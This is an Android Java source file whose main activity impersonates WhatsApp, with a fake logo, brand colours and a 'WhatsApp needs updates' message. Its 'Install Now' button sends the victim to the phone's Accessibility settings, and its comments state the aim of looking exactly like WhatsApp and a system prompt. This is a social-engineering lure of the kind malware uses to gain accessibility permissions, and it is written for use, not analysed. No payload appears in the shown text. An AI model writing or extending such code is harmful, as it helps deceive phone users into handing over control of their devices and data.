package com.compass.system;

import android.content.Intent;
import android.graphics.Color;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Create the exact WhatsApp look: White background, centered layout
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(Color.WHITE);
        layout.setGravity(Gravity.CENTER);
        layout.setPadding(50, 50, 50, 50);

        // Fake WhatsApp Logo (You can replace this with an actual image later)
        TextView logo = new TextView(this);
        logo.setText("💬"); // Placeholder for the WhatsApp icon
        logo.setTextSize(80f);
        logo.setGravity(Gravity.CENTER);
        
        // WhatsApp Style Text
        TextView title = new TextView(this);
        title.setText("WhatsApp needs updates");
        title.setTextSize(22f);
        title.setTextColor(Color.parseColor("#075E54")); // Official WhatsApp Dark Green
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 20, 0, 10);

        TextView subtitle = new TextView(this);
        subtitle.setText("A new version is required to continue using WhatsApp securely.");
        subtitle.setTextSize(14f);
        subtitle.setTextColor(Color.GRAY);
        subtitle.setGravity(Gravity.CENTER);
        subtitle.setPadding(0, 0, 0, 40);

        // The Install Button (Looks exactly like a system prompt button)
        Button btn = new Button(this);
        btn.setText("Install Now");
        btn.setTextColor(Color.WHITE);
        btn.setBackgroundColor(Color.parseColor("#25D366")); // Official WhatsApp Green
        btn.setPadding(40, 20, 40, 20);
        
        layout.addView(logo);
        layout.addView(title);
        layout.addView(subtitle);
        layout.addView(btn);
        setContentView(layout);

        // When they tap Install, it goes straight to the Accessibility settings
        btn.setOnClickListener(v -> {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        });
    }
}
